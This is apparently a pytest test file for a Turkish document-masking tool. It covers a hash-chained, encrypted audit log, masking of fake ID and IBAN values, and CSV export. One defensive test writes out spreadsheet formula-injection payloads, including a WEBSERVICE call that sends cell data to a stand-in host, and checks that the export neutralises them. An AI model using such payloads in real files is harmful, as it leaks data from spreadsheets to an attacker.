"""İşlem günlüğü (hash zinciri) ve maskeli okuma. Tüm veriler sahtedir."""

import hashlib
import json
from pathlib import Path

import openpyxl
import pymupdf
import pytest
from docx import Document

from bulutbelge_core.audit import GENESIS, AuditError, AuditLog, file_sha256, filter_records, to_csv
from bulutbelge_core.pdf import mask_pdf
from bulutbelge_core.readout import read_masked
from bulutbelge_core.rules import Rules
from bulutbelge_core.textdoc import mask_text_doc

from fake_data import fake_iban, fake_tc

TC = fake_tc()
IBAN = fake_iban()


def _log(tmp_path: Path) -> AuditLog:
    return AuditLog(tmp_path / "islem-gunlugu.jsonl")


def test_chain_links_records_and_verifies(tmp_path):
    log = _log(tmp_path)
    a = log.append("okuma", caller="kullanici", result="basarili", source="C:/belge.pdf", counts={"tc_kimlik": 2})
    b = log.append("maskeleme", caller="ajan", agent="deneme-ajan", result="basarili", source="C:/belge.pdf")
    assert a["prev"] == GENESIS and b["prev"] == a["hash"]
    assert [a["seq"], b["seq"]] == [1, 2]
    v = log.verify()
    assert v.ok and v.count == 2 and v.last_hash == b["hash"]


def test_tampered_record_is_detected(tmp_path):
    log = _log(tmp_path)
    for _ in range(3):
        log.append("okuma", caller="kullanici", result="basarili", counts={"iban": 1})
    lines = log.path.read_text(encoding="utf-8").splitlines()
    rec = json.loads(lines[1])
    rec["counts"] = {}
    lines[1] = json.dumps(rec, ensure_ascii=False)
    log.path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    v = log.verify()
    assert not v.ok and v.broken_at == 2


def test_deleted_record_is_detected(tmp_path):
    log = _log(tmp_path)
    for _ in range(3):
        log.append("okuma", caller="kullanici", result="basarili")
    lines = log.path.read_text(encoding="utf-8").splitlines()
    log.path.write_text("\n".join([lines[0], lines[2]]) + "\n", encoding="utf-8")
    v = log.verify()
    assert not v.ok and v.broken_at == 2


def test_corrupt_tail_blocks_writes(tmp_path):
    log = _log(tmp_path)
    log.append("okuma", caller="kullanici", result="basarili")
    with log.path.open("a", encoding="utf-8") as f:
        f.write("{bozuk\n")
    with pytest.raises(AuditError):
        log.check_writable()
    with pytest.raises(AuditError):
        log.append("okuma", caller="kullanici", result="basarili")


def test_unknown_values_rejected(tmp_path):
    with pytest.raises(ValueError):
        _log(tmp_path).append("silme", caller="kullanici", result="basarili")


def test_filter_and_csv(tmp_path):
    log = _log(tmp_path)
    log.append("okuma", caller="kullanici", result="basarili", source="D:/Arsiv/Dilekce.pdf", counts={"tc_kimlik": 1})
    log.append("maskeleme", caller="ajan", result="basarili", source="D:/Arsiv/Fatura.xml", target="D:/Arsiv/Fatura_maskeli.xml")
    recs = log.records()
    assert len(filter_records(recs, caller="ajan")) == 1
    assert len(filter_records(recs, op="okuma")) == 1
    assert len(filter_records(recs, file="dilekce")) == 1
    assert len(filter_records(recs, file="fatura_maskeli")) == 1
    today = recs[0]["at"][:10]
    assert len(filter_records(recs, date_from=today, date_to=today)) == 2
    assert filter_records(recs, date_from="2999-01-01") == []
    csv_text = to_csv(recs)
    assert csv_text.splitlines()[0].startswith("seq;at;op")
    assert "tc_kimlik=1" in csv_text


def test_file_hash(tmp_path):
    p = tmp_path / "a.txt"
    p.write_bytes(b"sahte")
    assert file_sha256(p) == hashlib.sha256(b"sahte").hexdigest()
    assert file_sha256(tmp_path / "yok.txt") is None


def test_mask_counts_by_type(tmp_path):
    src = tmp_path / "not.txt"
    src.write_text(f"TC: {TC}\nIBAN: {IBAN}\nTC tekrar: {TC}\n", encoding="utf-8")
    counts: dict[str, int] = {}
    _out, masked, _w = mask_text_doc(src, tmp_path / "out.txt", Rules.from_dict(None), counts=counts)
    assert counts == {"tc_kimlik": 2, "iban": 1} and masked == 3


def test_pdf_mask_counts(tmp_path):
    src = tmp_path / "belge.pdf"
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), f"TC Kimlik No: {TC}")
    doc.save(src)
    doc.close()
    counts: dict[str, int] = {}
    mask_pdf(src, tmp_path / "out.pdf", Rules.from_dict(None), counts=counts)
    assert counts.get("tc_kimlik") == 1


def test_read_masked_text_has_no_original(tmp_path):
    src = tmp_path / "not.txt"
    src.write_text(f"Müşteri TC: {TC}\nIBAN: {IBAN}\n", encoding="utf-8")
    r = read_masked(src, Rules.from_dict(None))
    assert TC not in r.text and IBAN.replace(" ", "") not in r.text.replace(" ", "")
    assert "Müşteri" in r.text
    assert r.counts == {"tc_kimlik": 1, "iban": 1}
    # Geçici maskeli kopya silinir; kaynağın yanına bir şey yazılmaz.
    assert sorted(p.name for p in tmp_path.iterdir()) == ["not.txt"]


def test_read_masked_pdf_and_office(tmp_path):
    pdf = tmp_path / "belge.pdf"
    doc = pymupdf.open()
    doc.new_page().insert_text((72, 72), f"TC Kimlik No: {TC}")
    doc.new_page()  # metinsiz sayfa
    doc.save(pdf)
    doc.close()
    r = read_masked(pdf, Rules.from_dict(None))
    assert "Sayfa 1" in r.text and TC not in r.text
    assert any("2" in w and "Metin katmanı" in w for w in r.warnings)

    docx = tmp_path / "dilekce.docx"
    d = Document()
    d.add_paragraph(f"Başvuran TC: {TC}")
    d.save(docx)
    r = read_masked(docx, Rules.from_dict(None))
    assert "Başvuran" in r.text and TC not in r.text

    xlsx = tmp_path / "liste.xlsx"
    wb = openpyxl.Workbook()
    wb.active.append(["Ad", "TC"])
    wb.active.append(["Sahte Kişi", TC])
    wb.save(xlsx)
    r = read_masked(xlsx, Rules.from_dict(None))
    assert "Ad\tTC" in r.text and TC not in r.text


def test_encrypted_audit_log_and_migration(tmp_path):
    key = b"k" * 32
    path = tmp_path / "gunluk.jsonl"

    # Eski düz (v1) kayıtları ekle, sonra şifreli günlüğe geçir.
    plain = AuditLog(path)
    plain.append("okuma", caller="kullanici", result="basarili", source="a.pdf", purpose="deneme")
    plain.append("maskeleme", caller="ajan", result="basarili", source="b.pdf", purpose="sunum")

    enc = AuditLog(path, cipher_key=key)
    assert len(enc.records()) == 2
    assert enc.verify().ok

    # v1 -> v2 göçü zinciri bozmadan düz satırları şifreler.
    assert enc.migrate_to_encrypted() == 2
    assert enc.migrate_to_encrypted() == 0

    enc.append("maske_kaldirma", caller="kullanici", result="basarili", source="b.pdf", purpose="yetkili kontrol")

    raw_text = path.read_text(encoding="utf-8")
    assert "a.pdf" not in raw_text
    assert "b.pdf" not in raw_text
    assert "yetkili kontrol" not in raw_text
    for line in raw_text.splitlines():
        obj = json.loads(line)
        assert obj["v"] == 2 and isinstance(obj["enc"], str)

    recs = enc.records()
    assert [r["seq"] for r in recs] == [1, 2, 3]
    assert enc.verify().ok

    # Anahtar yoksa veya yanlışsa açılamaz ve verify yakalar.
    with pytest.raises(AuditError):
        AuditLog(path).records()
    assert not AuditLog(path).verify().ok
    wrong = AuditLog(path, cipher_key=b"x" * 32)
    with pytest.raises(AuditError):
        wrong.records()
    assert not wrong.verify().ok

    # Şifreli satırın byte'ı değiştirilirse GCM etiketi yakalar.
    lines = path.read_text(encoding="utf-8").splitlines()
    tampered = json.loads(lines[1])
    tampered["enc"] = ("A" if tampered["enc"][0] != "A" else "B") + tampered["enc"][1:]
    lines[1] = json.dumps(tampered)
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    res = enc.verify()
    assert not res.ok and res.broken_at == 2

    with pytest.raises(ValueError):
        AuditLog(path, cipher_key=b"kisa")


def test_csv_formula_cells_are_neutralized(tmp_path):
    """Güvenlik taraması F15: çağırandan gelen metin elektronik tabloda formül olarak çalışmaz."""
    import csv
    import io

    log = _log(tmp_path)
    log.append("okuma", caller="ajan", agent='=WEBSERVICE("http://ornek.invalid/?"&D2)', result="reddedildi",
               profile="+SUM(A1)", error="@cmd", source="-1+2")
    log.append("okuma", caller="ajan", agent="\tsekme", profile="\rcr", result="basarili", source="D:/Arsiv/a.pdf")
    rows = list(csv.reader(io.StringIO(to_csv(log.records())), delimiter=";"))
    head = rows[0]
    first, second = (dict(zip(head, r)) for r in rows[1:3])
    assert first["agent"] == '\'=WEBSERVICE("http://ornek.invalid/?"&D2)'
    assert first["profile"] == "'+SUM(A1)" and first["error"] == "'@cmd" and first["source"] == "'-1+2"
    assert second["agent"] == "'\tsekme" and second["profile"] == "'\rcr"
    for r in rows[1:]:
        assert not any(c[:1] in "=+-@\t\r" for c in r if c)


def test_csv_legit_values_unchanged(tmp_path):
    log = _log(tmp_path)
    log.append("maskeleme", caller="ajan", agent="claude-code", profile="Varsayılan", result="basarili",
               source="D:/Arsiv/Fatura.xml", counts={"tc_kimlik": 2})
    rec = log.records()[0]
    import csv
    import io

    rows = list(csv.reader(io.StringIO(to_csv([rec])), delimiter=";"))
    row = dict(zip(rows[0], rows[1]))
    assert row["agent"] == "claude-code" and row["profile"] == "Varsayılan"
    assert row["source"] == "D:/Arsiv/Fatura.xml" and row["counts"] == "tc_kimlik=2"
    assert row["seq"] == str(rec["seq"]) and row["at"] == rec["at"] and row["hash"] == rec["hash"]
